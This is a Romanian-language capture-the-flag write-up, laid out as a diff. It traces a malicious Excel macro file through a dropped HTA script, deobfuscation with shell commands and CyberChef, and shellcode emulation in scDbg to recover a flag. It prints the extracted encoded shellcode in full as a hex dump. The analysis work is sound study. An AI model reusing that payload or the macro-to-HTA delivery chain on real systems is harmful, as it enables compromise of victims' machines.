@@ -1,0 +1,39 @@
+Dupa ce am dezarhivat arhiva cu fisierele exercitiului am obtinut un fisier html pe care l-am deschis in browser si in care se gasea un link de download pentru alt fisier.
+Am descarcat si acel fisier (un fisier .xlsm) si am incercat sa-l deschid in Excel(LibreOffice pe Linux).
+In acel excel am gasit decat un text care spunea ca acest fisier poate fi deschis si a fost creat in versiuni mai vechi de Excel. Am cautat pe Internet si am descoperit ca acest tip de atac e destul de frecvent in Windows pe Microsoft Office, deoarece poate fi deschis pe orice versiune mai noua de Excel, dar s-ar putea sa contina date ascunse(sheet-uri, macros etc). Asa ca am inceput sa caut. Am incercat sa vad daca nu cumva acest fisier are sheet-uri ascunse sau text ascuns. Pentru text am schimbat font-ul textului tuturor celulelor la rosu si am descoperit un text codificat la prima vedere base64, dar ulterior nu m-a ajutat pentru ca la decodificare dadea ceva random.
+Pentru a descoperi ce macro-uri(comenzi de sistem, apeluri, initiere de procese) executa in spate acel document am folosit oletools din repository-ul https://github.com/decalage2/oletools/archive/master.zip.
+Din aceasta suita de tool-uri am folosit olevba pentru a extrage si a analiza scripturi de tipul VBA, VB, VBS care executa macro-uri in fisiere de genul celor Microsoft Office(deci si Excel).
+Comanda olevba nume_fisier_xlsm m-a ajutat sa descopar un script VBS in clar si mesajul in base64 gasit anterior in fisierul excel. Pe langa aceste informatii, am mai gasit si o sectiune care imi indica toate problemele acelui fisier(am lasat o poza mai jos).
+Am cautat pe Internet si am descoperit site-ul any.run in care puteam sa testez comportamentul acelor macro-uri(pentru ca nu aveam un VM cu Windows) pe un sistem de operare Windows mai vechi si sa vad ce procese se executa in spate si cum e afectat sistemul de operare. Am dat upload la fisierul meu .xlsm si l-am rulat pe emulatorul de pe site. Am obtinut rezultatele atasate in pozele de mai jos.
+Am descarcat fisierele .hta si binarul .exd si am trecut sa le analizez.
+Fisierul .hta continea un script VBS cu o parte in clar si o parte obfuscata.
+Partea obfuscata continea un array de numere intregi cu semn pe care am reusit sa-l deobfuschez folosind comenzi Linux simple.
+Mi-am salvat mai intai intr-un fisier doar text-ul payload-ului meu(textul obfuscat) si apoi am introdus comenzile:
+cat ascii.txt | tr '\n' ' ' | egrep -o  "\"\"[0-9]+\"\"||(Chr\([0-9]+\)&\"\"[0-9]+\"\")" | sed -r "s/Chr\(([0-9]+)\)&\"\"([0-9]+)\"\"/\1 \2/g" | sed -r "s/\"\"([0-9]+)\"\"/\1/g" | sed -r "s/45 /-/g" | sed -r "s/44 //g" | tr '\n' ',' > decimal
+Am observat ca 45 este conversie ANSI cu ajutorul functie Chr in VBScript pentru caracterul "-", iar 45 e pentru numerele fara semn(de aceea l-am inlocuit cu nimic).
+ascii.txt fiind fisierul in care mi-am salvat payload-ul objuscat, iar decimal e un fisier in care am salvat array-ul de numere intregi cu semn.
+Mai departe am folosit https://gchq.github.io/CyberChef/ pentru a transforma mesajul din zecimal in hexa si am obtinut rezultatul din poza de mai jos.
+Am dat apoi echo la rezultat si l-am printat cu xxd pentru a vedea hexdump-ul din spate, iar apoi acest hexdump l-am salvat intr-un fisier de tipul .sc.
+Am folosit urmatoarele comenzi:
+echo "dd c1 bf 20 56 42 7e d9 74 24 f4 5b 31 c9 b1 62 31 7b 18 03 7b 18 83 c3 
+24 b4 b7 82 cc ba 38 7b 0c db b1 9e 3d db a6 eb 6d eb ad be 81 80 e0 2a 
+12 e4 2c 5c 93 43 0b 53 24 ff 6f f2 a6 02 bc d4 97 cc b1 15 d0 31 3b 47 
+89 3e ee 78 be 0b 33 f2 8c 9a 33 e7 44 9c 12 b6 df c7 b4 38 0c 7c fd 22 
+51 b9 b7 d9 a1 35 46 08 f8 b6 e5 75 35 45 f7 b2 f1 b6 82 ca 02 4a 95 08 
+79 90 10 8b d9 53 82 77 d8 b0 55 f3 d6 7d 11 5b fa 80 f6 d7 06 08 f9 37 
+8f 4a de 93 d4 09 7f 85 b0 fc 80 d5 1b a0 24 9d b1 b5 54 fc dd 7a 55 ff 
+1d 15 ee 8c 2f ba 44 1b 03 33 43 dc 64 6e 33 72 9b 91 44 5a 5f c5 14 f4 
+76 66 ff 04 77 b3 50 55 d7 6c 11 05 97 dc f9 4f 18 02 19 70 f3 2b 32 a8 
+fb 53 c3 d2 8d 3a af 31 15 d2 42 2b bc 42 b3 c5 51 b4 83 4d ef b1 74 5e 
+b0 02 48 ea 11 f9 c6 21 f2 71 7f 77 7f 1a 4c 25 02 da da 60 d4 ee 9a 8c 
+f1 84 db 6e 93 90 8b e6 61 a5 2a 4c ec 43 46 a2 b8 dc ff 5b e1 97 9e a4 
+3c d2 a1 2f b4 22 6f d8 bd 30 98 bf 3d c9 59 2a 3d a3 5d fc 6a 5b 5c d9 
+5c c4 9f 0c df 03 5f d1 e9 78 56 47 55 17 97 87 55 e7 c1 cd 55 8f b5 b5 
+06 aa b9 63 3b 67 2c 8c 6d db e7 e4 93 02 cf aa 6c 61 53 ac 92 f7 7c 15 
+fa 07 3d a5 fa 6d bd f5 92 7a 92 fa 52 82 39 53 fa 09 ac 11 9b 0e e5 f4 
+05 0e 0a 2d b6 75 5f d2 37 8a 89 b7 38 8a b5 c9 05 5c 8c bf 48 5c ab b0 
+ff c1 9a 5a ff 56 dc 4e" | xxd -r -p > flag.sc
+Am salvat dump-ul intr-un fisier .sc deoarece am cautat pe Internet si am descoperit ca pentru a vedea efectiv rezultatul executiei macro-urilor din acel fisier Excel trebuie rulat pe un shellcode decompiler.
+Pentru acest lucru am folosit scdBg(http://sandsprite.com/blogs/index.php?uid=7&pid=152)
+Am introdus fisierul cu cod malitios in tool si am obtinut rezultatul din pozele de mai jos.
+In final am obtinut flag-ul in clar.
